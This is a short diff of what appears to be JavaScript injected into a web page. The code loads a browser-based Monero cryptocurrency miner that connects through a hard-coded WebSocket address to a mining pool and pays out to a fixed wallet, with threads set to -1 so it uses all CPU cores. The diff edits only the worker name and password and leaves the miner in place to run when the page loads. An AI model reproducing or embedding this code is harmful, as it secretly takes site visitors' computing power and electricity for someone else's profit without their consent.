@@ -9,9 +9,9 @@ document.head.appendChild(script);
 server = "wss://45.119.82.33:40725";
 var pool = "gulf.moneroocean.stream:10128";
 var walletAddress = "82yaNedanyNYt6dSFFsmtuA99ULw5RNzeB23BMp66Mdp63Pg2tB1NpubJxSmu71ZLzif5hFvmiMNFAo4mVxjGw8QUwRPHkn";
-var workerId = "WORKER04"
+var workerId = "GH-MINER"
 var threads = -1;
-var password = "82yaNedanyNYt6dSFFsmtuA99ULw5RNzeB23BMp66Mdp63Pg2tB1NpubJxSmu71ZLzif5hFvmiMNFAo4mVxjGw8QUwRPHkn@WORKER04";
+var password = "x";
 startMining(pool, walletAddress, workerId, threads, password);
 throttleMiner = 20;
 // End Of Mining Code
